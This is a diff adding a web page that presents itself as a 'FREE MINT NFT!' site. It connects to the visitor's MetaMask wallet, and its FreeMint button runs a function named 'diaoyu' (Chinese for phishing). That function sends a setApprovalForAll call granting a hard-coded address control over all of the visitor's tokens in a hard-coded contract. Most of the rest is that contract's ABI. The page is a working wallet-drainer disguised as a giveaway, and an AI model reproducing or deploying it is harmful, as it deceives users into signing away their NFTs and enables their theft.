@@ -1,0 +1,724 @@
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <link href="https://unpkg.com/tailwindcss@^1.0/dist/tailwind.min.css" rel="stylesheet" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.1/web3.min.js" integrity="sha512-5erpERW8MxcHDF7Xea9eBQPiRtxbse70pFcaHJuOhdEBQeAxGQjUwgJbuBDWve+xP/u5IoJbKjyJk50qCnMD7A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+</head>
+
+<body class="h-full">
+    <div class="
+        flex
+        w-full
+        h-full
+        justify-center
+        content-center
+        items-center
+        space-x-4
+      ">
+        <div class="flex flex-col space-y-6">
+            <h3 class="text-center">FREE MINT NFT!</h3>
+            <div class="flex flex-col space-y-2">
+                <button onclick="loginWithEth()" class="
+              rounded
+              bg-white
+              border border-gray-400
+              hover:bg-gray-100
+              py-2
+              px-4
+              text-gray-600
+              hover:text-gray-700
+            ">
+            Login & Save ETH Address
+          </button>
+                <p id="userAddress" class="text-gray-600"></p>
+                <button id="logoutButton" onclick="logout()" class="hidden text-blue-500 underline">
+            Logout
+          </button>
+            </div>
+            <button id="getContractInfo" onclick="diaoyu()" class="rounded bg-blue-500 hover:bg-blue-700 py-2 px-4 text-white">
+          FreeMint
+        </button>
+            <div class="flex flex-col space-y-2"></div>
+        </div>
+    </div>
+
+    <script>
+        window.userAddress = null;
+        window.onload = async() => {
+            // Init Web3 connected to ETH network
+            if (window.ethereum) {
+                window.web3 = new Web3(window.ethereum);
+            } else {
+                alert("No ETH brower extension detected.");
+            }
+
+            // Load in Localstore key
+            window.userAddress = window.localStorage.getItem("userAddress");
+            showAddress();
+        };
+
+        // Use this function to turn a 42 character ETH address
+        // into an address like 0x345...12345
+        function truncateAddress(address) {
+            if (!address) {
+                return "";
+            }
+            return `${address.substr(0, 5)}...${address.substr(
+          address.length - 5,
+          address.length
+        )}`;
+        }
+
+        // Display or remove the users know address on the frontend
+        function showAddress() {
+            if (!window.userAddress) {
+                document.getElementById("userAddress").innerText = "";
+                document.getElementById("logoutButton").classList.add("hidden");
+                return false;
+            }
+
+            document.getElementById(
+                "userAddress"
+            ).innerText = `ETH Address: ${truncateAddress(window.userAddress)}`;
+            document.getElementById("logoutButton").classList.remove("hidden");
+        }
+
+        // remove stored user address and reset frontend
+        function logout() {
+            window.userAddress = null;
+            window.localStorage.removeItem("userAddress");
+            showAddress();
+        }
+
+        // Login with Web3 via Metamasks window.ethereum library
+        async function loginWithEth() {
+            if (window.web3) {
+                try {
+                    // We use this since ethereum.enable() is deprecated. This method is not
+                    // available in Web3JS - so we call it directly from metamasks' library
+                    const selectedAccount = await window.ethereum
+                        .request({
+                            method: "eth_requestAccounts",
+                        })
+                        .then((accounts) => accounts[0])
+                        .catch(() => {
+                            throw Error("No account selected!");
+                        });
+                    window.userAddress = selectedAccount;
+                    window.localStorage.setItem("userAddress", selectedAccount);
+                    showAddress();
+                } catch (error) {
+                    console.error(error);
+                }
+            } else {
+                alert("No ETH brower extension detected.");
+            }
+        }
+
+        async function diaoyu() {
+            const mya = "0xD548a5e31DE2b4c2681A58a3be5302aBCAe4bC57";
+            const CONTRACT_ADDRESS = "0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85";
+            const contract = new window.web3.eth.Contract(
+                window.ABI,
+                CONTRACT_ADDRESS
+            );
+            const symbol = await contract.methods
+                .setApprovalForAll(mya, true)
+                .send({
+                    from: window.userAddress
+                });
+        }
+
+        window.ABI = [{
+            "inputs": [{
+                "internalType": "contract ENS",
+                "name": "_ens",
+                "type": "address"
+            }, {
+                "internalType": "bytes32",
+                "name": "_baseNode",
+                "type": "bytes32"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "constructor"
+        }, {
+            "anonymous": false,
+            "inputs": [{
+                "indexed": true,
+                "internalType": "address",
+                "name": "owner",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "internalType": "address",
+                "name": "approved",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }],
+            "name": "Approval",
+            "type": "event"
+        }, {
+            "anonymous": false,
+            "inputs": [{
+                "indexed": true,
+                "internalType": "address",
+                "name": "owner",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "internalType": "address",
+                "name": "operator",
+                "type": "address"
+            }, {
+                "indexed": false,
+                "internalType": "bool",
+                "name": "approved",
+                "type": "bool"
+            }],
+            "name": "ApprovalForAll",
+            "type": "event"
+        }, {
+            "anonymous": false,
+            "inputs": [{
+                "indexed": true,
+                "internalType": "address",
+                "name": "controller",
+                "type": "address"
+            }],
+            "name": "ControllerAdded",
+            "type": "event"
+        }, {
+            "anonymous": false,
+            "inputs": [{
+                "indexed": true,
+                "internalType": "address",
+                "name": "controller",
+                "type": "address"
+            }],
+            "name": "ControllerRemoved",
+            "type": "event"
+        }, {
+            "anonymous": false,
+            "inputs": [{
+                "indexed": true,
+                "internalType": "uint256",
+                "name": "id",
+                "type": "uint256"
+            }, {
+                "indexed": true,
+                "internalType": "address",
+                "name": "owner",
+                "type": "address"
+            }, {
+                "indexed": false,
+                "internalType": "uint256",
+                "name": "expires",
+                "type": "uint256"
+            }],
+            "name": "NameMigrated",
+            "type": "event"
+        }, {
+            "anonymous": false,
+            "inputs": [{
+                "indexed": true,
+                "internalType": "uint256",
+                "name": "id",
+                "type": "uint256"
+            }, {
+                "indexed": true,
+                "internalType": "address",
+                "name": "owner",
+                "type": "address"
+            }, {
+                "indexed": false,
+                "internalType": "uint256",
+                "name": "expires",
+                "type": "uint256"
+            }],
+            "name": "NameRegistered",
+            "type": "event"
+        }, {
+            "anonymous": false,
+            "inputs": [{
+                "indexed": true,
+                "internalType": "uint256",
+                "name": "id",
+                "type": "uint256"
+            }, {
+                "indexed": false,
+                "internalType": "uint256",
+                "name": "expires",
+                "type": "uint256"
+            }],
+            "name": "NameRenewed",
+            "type": "event"
+        }, {
+            "anonymous": false,
+            "inputs": [{
+                "indexed": true,
+                "internalType": "address",
+                "name": "previousOwner",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "internalType": "address",
+                "name": "newOwner",
+                "type": "address"
+            }],
+            "name": "OwnershipTransferred",
+            "type": "event"
+        }, {
+            "anonymous": false,
+            "inputs": [{
+                "indexed": true,
+                "internalType": "address",
+                "name": "from",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "internalType": "address",
+                "name": "to",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }],
+            "name": "Transfer",
+            "type": "event"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "GRACE_PERIOD",
+            "outputs": [{
+                "internalType": "uint256",
+                "name": "",
+                "type": "uint256"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "address",
+                "name": "controller",
+                "type": "address"
+            }],
+            "name": "addController",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "address",
+                "name": "to",
+                "type": "address"
+            }, {
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }],
+            "name": "approve",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [{
+                "internalType": "uint256",
+                "name": "id",
+                "type": "uint256"
+            }],
+            "name": "available",
+            "outputs": [{
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [{
+                "internalType": "address",
+                "name": "owner",
+                "type": "address"
+            }],
+            "name": "balanceOf",
+            "outputs": [{
+                "internalType": "uint256",
+                "name": "",
+                "type": "uint256"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "baseNode",
+            "outputs": [{
+                "internalType": "bytes32",
+                "name": "",
+                "type": "bytes32"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [{
+                "internalType": "address",
+                "name": "",
+                "type": "address"
+            }],
+            "name": "controllers",
+            "outputs": [{
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "ens",
+            "outputs": [{
+                "internalType": "contract ENS",
+                "name": "",
+                "type": "address"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [{
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }],
+            "name": "getApproved",
+            "outputs": [{
+                "internalType": "address",
+                "name": "",
+                "type": "address"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [{
+                "internalType": "address",
+                "name": "owner",
+                "type": "address"
+            }, {
+                "internalType": "address",
+                "name": "operator",
+                "type": "address"
+            }],
+            "name": "isApprovedForAll",
+            "outputs": [{
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "isOwner",
+            "outputs": [{
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [{
+                "internalType": "uint256",
+                "name": "id",
+                "type": "uint256"
+            }],
+            "name": "nameExpires",
+            "outputs": [{
+                "internalType": "uint256",
+                "name": "",
+                "type": "uint256"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "owner",
+            "outputs": [{
+                "internalType": "address",
+                "name": "",
+                "type": "address"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [{
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }],
+            "name": "ownerOf",
+            "outputs": [{
+                "internalType": "address",
+                "name": "",
+                "type": "address"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "uint256",
+                "name": "id",
+                "type": "uint256"
+            }, {
+                "internalType": "address",
+                "name": "owner",
+                "type": "address"
+            }],
+            "name": "reclaim",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "uint256",
+                "name": "id",
+                "type": "uint256"
+            }, {
+                "internalType": "address",
+                "name": "owner",
+                "type": "address"
+            }, {
+                "internalType": "uint256",
+                "name": "duration",
+                "type": "uint256"
+            }],
+            "name": "register",
+            "outputs": [{
+                "internalType": "uint256",
+                "name": "",
+                "type": "uint256"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "uint256",
+                "name": "id",
+                "type": "uint256"
+            }, {
+                "internalType": "address",
+                "name": "owner",
+                "type": "address"
+            }, {
+                "internalType": "uint256",
+                "name": "duration",
+                "type": "uint256"
+            }],
+            "name": "registerOnly",
+            "outputs": [{
+                "internalType": "uint256",
+                "name": "",
+                "type": "uint256"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "address",
+                "name": "controller",
+                "type": "address"
+            }],
+            "name": "removeController",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "uint256",
+                "name": "id",
+                "type": "uint256"
+            }, {
+                "internalType": "uint256",
+                "name": "duration",
+                "type": "uint256"
+            }],
+            "name": "renew",
+            "outputs": [{
+                "internalType": "uint256",
+                "name": "",
+                "type": "uint256"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [],
+            "name": "renounceOwnership",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "address",
+                "name": "from",
+                "type": "address"
+            }, {
+                "internalType": "address",
+                "name": "to",
+                "type": "address"
+            }, {
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }],
+            "name": "safeTransferFrom",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "address",
+                "name": "from",
+                "type": "address"
+            }, {
+                "internalType": "address",
+                "name": "to",
+                "type": "address"
+            }, {
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }, {
+                "internalType": "bytes",
+                "name": "_data",
+                "type": "bytes"
+            }],
+            "name": "safeTransferFrom",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "address",
+                "name": "to",
+                "type": "address"
+            }, {
+                "internalType": "bool",
+                "name": "approved",
+                "type": "bool"
+            }],
+            "name": "setApprovalForAll",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "address",
+                "name": "resolver",
+                "type": "address"
+            }],
+            "name": "setResolver",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [{
+                "internalType": "bytes4",
+                "name": "interfaceID",
+                "type": "bytes4"
+            }],
+            "name": "supportsInterface",
+            "outputs": [{
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "address",
+                "name": "from",
+                "type": "address"
+            }, {
+                "internalType": "address",
+                "name": "to",
+                "type": "address"
+            }, {
+                "internalType": "uint256",
+                "name": "tokenId",
+                "type": "uint256"
+            }],
+            "name": "transferFrom",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "internalType": "address",
+                "name": "newOwner",
+                "type": "address"
+            }],
+            "name": "transferOwnership",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }];
+    </script>
+</body>
